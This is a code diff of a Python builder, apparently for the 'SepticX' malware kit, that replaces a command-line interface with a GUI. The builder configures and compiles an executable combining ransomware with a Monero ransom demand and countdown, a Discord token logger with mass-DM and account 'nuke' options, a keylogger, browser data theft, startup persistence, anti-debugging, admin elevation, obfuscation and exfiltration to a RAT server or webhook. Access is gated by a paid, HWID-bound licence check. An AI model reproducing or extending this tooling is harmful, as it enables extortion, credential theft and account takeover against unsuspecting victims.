@@ -1,15 +1,269 @@
+
+from tqdm import tqdm
+from tkinter import *
+from PIL import Image
+import customtkinter, tkinter
+from tkinter import filedialog as fd
 from colorama import Style, Fore, Back
 from websocket import create_connection
-from tqdm import tqdm
-import subprocess, websocket, requests, random, base64, json, fade, time, math, sys, ssl, os
+import customtkinter, subprocess, websocket, threading, requests, tkinter, random, base64, json, fade, time, math, sys, ssl, os
 
-class Main:
+customtkinter.set_appearance_mode("dark")
+
+class Frame(customtkinter.CTkFrame):
+    def __init__(self, master, widgets, intonly=[], default=[], row=0, column=0, rowspan=0, columnspan=0, padx=20, pady=20, activation_widget=0):
+        super().__init__(master)
+
+        self.grid(row=row, column=column, columnspan=columnspan, rowspan=rowspan, padx=20, pady=20, sticky="nsew")
+
+        for i in range(7): # Set 7 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(6): # Set 6 columns
+            self.columnconfigure(i, weight= 1)
+
+        
+
+        for count, (title, data) in enumerate(widgets.items()):
+            x = (count // 1) + 1
+            y = (count % 1) * 1
+
+            widget_type = data[0]
+
+            if widget_type is customtkinter.CTkEntry:
+                var = tkinter.IntVar(value=0)
+                widget = widget_type(master=self, placeholder_text=title)
+                if count in intonly:
+                    vcmd = (self.register(self.enter_only_digits), '%P', '%d')
+                    widget.configure(validate='key', validatecommand=vcmd)
+
+                if count not in default:
+                    widget.configure(state="disabled")
+
+            elif widget_type is customtkinter.CTkCheckBox:
+                widget = widget_type(master=self, text=title, onvalue=True, offvalue=False)
+
+                if activation_widget == count:
+                    activate_widget = widget
+                    widget.configure(command=lambda: self.on_click(widgets, default, activate_widget.get()))
+
+            else:
+                self.icon = tkinter.StringVar(value="")
+
+                widget = widget_type(master=self, text=title, command=lambda: self.file_prompt())
+                widget.grid(row=x, column=2, sticky="nsew")
+
+                widgets[title] = self.icon
+
+                continue
+                
+
+            widgets[title] = widget
+            widget.grid(row=x, column=2, sticky="nsew")
+
+    def enter_only_digits(self, entry, action_type) -> bool:
+        if action_type == '1' and not entry.isdigit():
+            return False
+
+        return True
+
+    def on_click(self, widgets, default, state):
+        for count, widget in enumerate(widgets.values()):
+            print(default)
+            if count in default:
+                continue
+            if isinstance(widget, customtkinter.CTkEntry):
+                widget.configure(state="disabled" if not state else "normal")
+
+    def file_prompt(self):
+        filetypes = (
+            ('ICO files', '*.ico'),
+        )
+
+        filename = fd.askopenfilename(
+            title='Open a file',
+            initialdir='/',
+            filetypes=filetypes)
+
+        self.icon.set(filename)
+
+class App(customtkinter.CTk):
     def __init__(self):
         os.system('')
+        self.hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
         self.banner()
-        config = self.get_input()
-        print(f'{Fore.CYAN}Compiling program...{Style.RESET_ALL}')
-        self.compile(config)
+
+        super().__init__()
+
+        self.geometry("1100x600")
+
+        for i in range(21): # Set 21 rows
+            self.rowconfigure(i, weight= 1)
+        
+        for i in range(18): # Set 18 columns
+            self.columnconfigure(i, weight= 1)
+
+        pil_image = Image.open("assets\\Title.png")
+        image = customtkinter.CTkImage(dark_image=pil_image, light_image=pil_image, size=(400, 90))
+
+        title = customtkinter.CTkLabel(self, image=image, text="")
+        title.grid(row=0, column=0, columnspan=24, sticky="nsew")
+
+        self.get_key()
+
+    def get_key(self):
+        key_frame = customtkinter.CTkFrame(self)
+        key_frame.grid(row=1, column=0, padx=20, pady=20, sticky="nsew", columnspan=18, rowspan=21)
+        
+        for i in range(16): # Set 16 rows
+            key_frame.rowconfigure(i, weight= 1)
+        
+        for i in range(16): # Set 16 columns
+            key_frame.columnconfigure(i, weight= 1)
+
+        key_entry = customtkinter.CTkEntry(key_frame, placeholder_text='Enter Key')
+        key_entry.grid(row=8, column=8, padx=20, pady=20, sticky="nesw")
+
+        response_label = customtkinter.CTkLabel(key_frame, text="")
+        response_label.grid(row=9, column=8, columnspan=2, padx=0, pady=20, sticky="nesw")
+
+        submit = customtkinter.CTkButton(key_frame, text='Submit', command=lambda: self.verify_key(key_entry.get(), response_label))
+        submit.grid(row=8, column=9, padx=0, pady=20, sticky="nesw")
+    
+
+    def verify_key(self, key, label):
+        status_code = requests.get('https://septicx.repl.co/api/verify', data={'key':key, 'hwid': self.hwid}).status_code
+
+        if status_code == 200:
+            label.configure(text='Success!')
+            time.sleep(1)
+
+            self.key = key
+
+            for child in self.winfo_children()[1:]:
+                child.destroy() # Abortion clinic
+
+            self.menu()
+
+        else:
+            label.configure(text='Invalid Key')
+
+    def menu(self):
+        main_frame = customtkinter.CTkFrame(self)
+        main_frame.grid(row=1, column=0, padx=20, pady=20, sticky="nsew", columnspan=18, rowspan=21)
+
+        for i in range(15): # Set 15 rows
+            main_frame.rowconfigure(i, weight= 1)
+        
+        for i in range(15): # Set 15 columns
+            main_frame.columnconfigure(i, weight= 1)
+    
+
+        ransomware_widgets = {
+            "Ransomware": [customtkinter.CTkCheckBox],
+            "Reboots Until Run": [customtkinter.CTkEntry],
+            "Ransom Time Limit (Hours)": [customtkinter.CTkEntry],
+            "Crypto Address": [customtkinter.CTkEntry],
+            "Ransom Amount": [customtkinter.CTkEntry],
+            "Crypto Currency": [customtkinter.CTkEntry]
+        }
+        
+        ransom_frame = Frame(master=main_frame, widgets=ransomware_widgets, row=0, column=11, columnspan=3, rowspan=10, pady=0, padx=0, intonly=[1, 2, 4])
+
+        discord_widgets = {
+            "Token Logger": [customtkinter.CTkCheckBox],
+            "Auto Nuke": [customtkinter.CTkCheckBox],
+            "MassDM": [customtkinter.CTkCheckBox],
+            "MassDM Script": [customtkinter.CTkEntry]
+        }
+        
+        discord_frame = Frame(master=main_frame, widgets=discord_widgets, row=0, column=8, columnspan=3, rowspan=10, pady=0, padx=0)
+
+        connection_widgets = {
+            "Connect To Server": [customtkinter.CTkCheckBox],
+            "Dynamic Webhook": [customtkinter.CTkCheckBox],
+            "Server Address": [customtkinter.CTkEntry],
+            "Server Password": [customtkinter.CTkEntry],
+            "Webhook": [customtkinter.CTkEntry]
+            
+        }
+        
+        connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=10, pady=0, padx=0)
+
+        misc_widgets = {
+            "Key Logger": [customtkinter.CTkCheckBox],
+            "Browser Logs": [customtkinter.CTkCheckBox],
+            "Add To Startup": [customtkinter.CTkCheckBox],
+            "File Icon": [customtkinter.CTkButton],
+            "Anti Debug": [customtkinter.CTkCheckBox],
+            "Run As Admin": [customtkinter.CTkCheckBox],
+            "Base Obfuscation": [customtkinter.CTkEntry],
+            "Obfuscation Level": [customtkinter.CTkEntry]
+        }
+        
+        misc_frame = Frame(master=main_frame, widgets=misc_widgets, intonly=[6, 7], default=[6, 7], row=0, column=1, columnspan=3, rowspan=15, pady=0, padx=0, activation_widget=None)
+
+        
+
+        # Compile Buttom
+        button = customtkinter.CTkButton(master=main_frame, text="Compile", command=threading.Thread(target=self.start_compile, args=(ransomware_widgets, discord_widgets, connection_widgets, misc_widgets)).start)
+        button.grid(row=14, column=7, columnspan=2, sticky="ew")
+
+        self.response_label = customtkinter.CTkLabel(master=main_frame, text="", justify='center')
+        self.response_label.grid(row=15, column=7, columnspan=2, sticky="ew")
+
+    def start_compile(self, ransomware_config, discord_config, connection_config, misc_config):
+        
+        server_addr = ''
+        server_key = ''
+        wallet = ''
+        massdm_script = ''
+        cost = 0
+        crypto_type = ''
+        reboots_allowed = 0
+        hours = 0
+        webhook = ''
+        massdm = False
+        auto_nuke = False
+        massdm_script = ''
+        keylogger = False
+        dynamic_webhook = False
+        
+        ransomware = ransomware_config["Ransomware"].get()
+        if ransomware:
+            reboots_allowed = ransomware_config['Reboots Until Run'].get()
+            hours = ransomware_config['Ransom Time Limit (Hours)'].get()
+            wallet = ransomware_config['Crypto Address'].get()
+            cost = ransomware_config['Ransom Amount'].get()
+            crypto_type = ransomware_config['Crypto Currency'].get()
+
+        token_logger = discord_config['Token Logger'].get()
+        if token_logger:
+            massdm = token_logger['MassDM'].get()
+            massdm_script = token_logger['MassDM Script'].get()
+            auto_nuke = token_logger['Auto Nuke'].get()
+        
+        rat_client = connection_config['Connect To Server'].get()
+        if rat_client:
+            server_addr = base64.b64encode(connection_config['Server Address'].get().replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
+            server_key = base64.b64encode(connection_config['Server Key'].get().encode()).decode()
+            dynamic_webhook = connection_config['Dynamic Webhook'].get()
+        else:
+            webhook = connection_config['Webhook'].get()
+
+        keylogger = misc_config['Key Logger'].get()
+        browser = misc_config['Browser Logs'].get()
+        startup = misc_config['Add To Startup'].get()
+        icon = misc_config['File Icon'].get()
+        debug = misc_config['Anti Debug'].get()
+        admin = misc_config['Run As Admin'].get()
+
+        self.base = misc_config['Base Obfuscation'].get()
+        self.recursion = misc_config['Obfuscation Level'].get()
+
+        self.response_label.configure(text='Compiling To Exe...')
+
+        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin])
 
     def banner(self):
         print(fade.greenblue("""
@@ -22,28 +276,6 @@ class Main:
    ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
  ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
         """))
-
-    def get_answer(self, message):
-        answers = ('n', 'y')
-
-        answer = input(message)
-
-        while True:
-            
-            if not answer:
-                print(self.color("Invalid answer!", 'red'), end="\r")
-                time.sleep(1)
-                answer = input(message)
-                continue
-
-            target = answer[0].lower()
-            if not target in answers:
-                print(self.color("Invalid answer!", 'red'), end="\r")
-                time.sleep(1)
-                answer = input(message)
-                continue
-
-            return target == 'y'
 
     def compile(self, config):
         rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin = config
@@ -73,8 +305,7 @@ class Main:
             "options": {
                 "base": self.base,
                 "recursion": self.recursion,
-                "bytes": self.bytes,
-                "admin": admin,
+                "bytes": True
             },
             "config": key,
             "hwid": self.hwid,
@@ -99,34 +330,8 @@ class Main:
             command.remove('')
         print(command)
 
-        # if self.server_convert:
-        #     ws = create_connection('wss://septicx.repl.co/api/ws/build', sslopt={
-        #         "cert_reqs": ssl.CERT_NONE
-        #     }, headers={})
-        #     ws.send(self.key)
-        #     ws.send(self.hwid)
-        #     ws.send(json.dumps({
-        #         'code': src.decode(),
-        #         'config': {
-        #             'admin': admin,
-        #             'icon': base64.b64encode(open(icon, 'rb').read()).decode() if icon else '',
-        #             "wallpaper_AJ3.jpg": base64.b64encode(open('src\\files\\annoy.mp3', 'rb').read()).decode(),
-        #             "instructions.txt": base64.b64encode(open('src\\temp\\instructions.txt', 'rb').read()).decode(),
-        #             "annoy.mp3": base64.b64encode(open('src\\files\\annoy.mp3', 'rb').read()).decode()
-        #         }
-        #     }))
-
-        #     prev = ''
-        #     while True:
-        #         line = ws.recv()
-        #         if not line:
-        #             code = prev
-        #         else:
-        #             print(line)
-            
-        #     with open('dist\\output.exe', 'wb') as file:
-        #         file.write(base64.b64decode(prev))
         subprocess.call(command, shell=True)
+        self.response_label.configure(text='EXE in dist folder')
         print(self.color('Your file is in the dist folder named "output.exe"'))
         os.system('PAUSE')
         
@@ -139,206 +344,6 @@ class Main:
 
         return key[color] + text + Style.RESET_ALL
 
-    def get_input(self):
-        server_addr = ''
-        server_key = ''
-        wallet = ''
-        massdm_script = ''
-        cost = 0
-        crypto_type = ''
-        reboots_allowed = 0
-        hours = 0
-        webhook = ''
-        massdm = False
-        auto_nuke = False
-        massdm_script = ''
-        keylogger = False
-        dynamic_webhook = False
-        color = self.color
-        
-        self.hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
-
-        while True:
-            print(color("Enter API key: "), end="> ")
-            self.key = input("")
-            test = requests.get('https://septicx.repl.co/api/verify', data={'key':self.key, 'hwid': self.hwid})
-            if not test.status_code == 200:
-                print(color('Invalid Key!'+' '*30, 'red'), end='\r')
-                time.sleep(1)
-                continue
-
-            for x, char in enumerate(color('Valid Key!', 'green')):
-                if not x+1 == len(color('Valid Key!', 'green')):
-                    sys.stdout.write(char)
-                    sys.stdout.flush()
-                else:
-                    print(char)
-                time.sleep(0.05)
-
-            self.premium = test.json()['response']['premium']
-
-            while self.premium: # No, deleting this will not "crack the program"
-                print(color("Enter Obfuscation Level (1-5): "), end="> ")
-                try:
-                    self.recursion = int(input(""))
-                except:
-                    print(color('Invalid Input!', 'red'), end='\r')
-                    time.sleep(1)
-                    continue
-
-                break
-
-            else:
-                print(color("Enter Obfuscation Level (1-5): "), end="> ")
-                print(color('(Premium required)', 'red'))
-                time.sleep(1)
-                    
-
-            while self.premium:
-                print(color("Set Base Obfuscation Level (2-55000): "), end="> ")
-                try:
-                    self.base = int(input(""))
-                except:
-                    print(color('Invalid Input!', 'red'), end='\r')
-                    time.sleep(1)
-                    continue
-
-                break
-            else:
-                print(color("Set Base Obfuscation Level (2-55000): "), end="> ")
-                print(color('(Premium required)', 'red'))
-                time.sleep(1)
-            
-
-            while self.premium:
-                print(color("Use random byte characters (Y or N): "), end="> ")
-                try:
-                    self.bytes = self.get_answer("")
-                    if not self.bytes:
-                        self.base = 93
-                except:
-                    print(color("Use random byte characters (Y or N): "), end="> ")
-                    print(color('Invalid Input!', 'red'), end='\r')
-                    time.sleep(1)
-                    continue
-
-                break
-            else:
-                print(color("Use random byte characters (Y or N): "), end="> ")
-                print(color('(Premium required)', 'red'))
-                time.sleep(1)
-                self.recursion = 0
-                self.bytes = 0
-                self.base = 0
-
-            break
-
-
-        load = self.get_answer(color("Load config from config.json (Y or N): ")+"> ")
-
-        if load:
-            config = json.load(open('config.json', 'r+'))
-
-            rat_client = config['CONNECT_TO_SERVER'][0]
-            if rat_client:
-                server_addr = base64.b64encode(config['CONNECT_TO_SERVER'][1]['SERVER_ADDRESS'].replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
-                server_key = base64.b64encode(config['CONNECT_TO_SERVER'][1]['SERVER_KEY'].encode()).decode()
-                dynamic_webhook = config['CONNECT_TO_SERVER'][1]['DYNAMIC_WEBHOOK']
-                keylogger = config['KEYLOGGER']
-            else:
-                webhook = config['WEBHOOK']
-
-            ransomware = config['RANSOMWARE'][0]
-            if ransomware:
-                reboots_allowed = config['RANSOMWARE'][1]['REBOOTS_ALLOWED']
-                hours = config['RANSOMWARE'][1]['PAYMENT_TIMELIMIT_IN_HOURS']
-                wallet = config['RANSOMWARE'][1]['WALLET']
-                cost = config['RANSOMWARE'][1]['RANSOM_AMOUNT']
-                crypto_type = config['RANSOMWARE'][1]['CRYPTO_CURRENCY_TYPE']
-
-            token_logger = config['TOKEN_LOGGER'][0]
-            if token_logger:
-                massdm = config['TOKEN_LOGGER'][1]['MASSDM']
-                massdm_script = config['TOKEN_LOGGER'][1]['MASSDM_SCRIPT']
-                auto_nuke = config['TOKEN_LOGGER'][1]['AUTO_NUKE']
-
-            browser = config['LOG_BROWSER']
-            startup = config['ADD_TO_STARTUP']
-            debug = config['ANTI_DEBUG']
-            icon = config['FILE_ICON']
-            admin = config['RUN_WITH_ADMIN']
-
-        else:
-            rat_client = self.get_answer(color("Connect to webserver? (Y or N): ")+"> ")
-
-            if rat_client:
-                print(color("Enter server address: "), end="")
-                server_addr = base64.b64encode(input("> ").replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()
-
-                print(color("Enter server key: "), end="")
-                server_key = base64.b64encode(input("> ").encode()).decode()
-
-                dynamic_webhook = self.get_answer(color("Enable Dynamic Webhooks (Y or N): ")+'> ')
-
-                keylogger = self.get_answer(color("Enable Keylogging (Y or N): ")+"> ")
-
-            if not dynamic_webhook:
-                webhook = base64.b64encode(input("> ").encode())
-
-            ransomware = self.get_answer(color("Enable Ransomware (Y or N): ")+"> ")
-
-            if ransomware:
-                while True:
-                    try:
-                        print(color("How many reboots until ransomware runs: "), end="")
-                        reboots_allowed = int(input("> "))
-                        break
-                    except:
-                        print(color('Invalid number!', 'red'), end='\r')
-                        time.sleep(1)
-
-                while True:
-                    try:
-                        print(color("Amount of time user has to send the payment (Hours): "), end="")
-                        hours = int(input("> "))
-                        break
-                    except:
-                        print(color('Invalid number!', 'red'), end='\r')
-                        time.sleep(1)
-
-                print(color("Enter your Monero Wallet: "), end="")
-                wallet = input("> ")
-
-                print(color("Enter cost to retrieve files: "), end="")
-                cost = input("> ")
-
-                print(color("Enter Crypto Currency type: "), end="")
-                crypto_type = input("> ")
-
-            token_logger = self.get_answer(color("Enable Token Logging (Y or N): ")+"> ")
-
-            if token_logger:
-                massdm = self.get_answer(color("Enable Discord MassDM (Y or N): ")+"> ")
-
-                if massdm:
-                    print(color("Enter massdm script below (For New Lines use \\n): "), end="")
-                    massdm_script = (input('>')).replace('\\n', '\n')
-
-                auto_nuke = self.get_answer(color("Enable Auto Token Nuke (Y or N): ")+"> ")
-
-            browser = self.get_answer(color("Enable Browser Logs (Y or N): ")+"> ")
-            startup = self.get_answer(color("Run on startup (Y or N): ")+"> ")
-            debug = self.get_answer(color("Anti Debug (Y or N): ")+"> ")
-
-            print(color("Custom Icon Path (Leave Blank if none): "), end="")
-            icon = input("> ")
-
-            admin = self.get_answer(color("Run as Administator? (Y or N): ")+"> ")
-
-        # self.server_convert = self.get_answer(color("Compile via CloudConvert? (Y or N): ")+"> ")
-
-        return rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin
-            
-
 if __name__ == "__main__":
-    Main()
+    app = App()
+    app.mainloop()
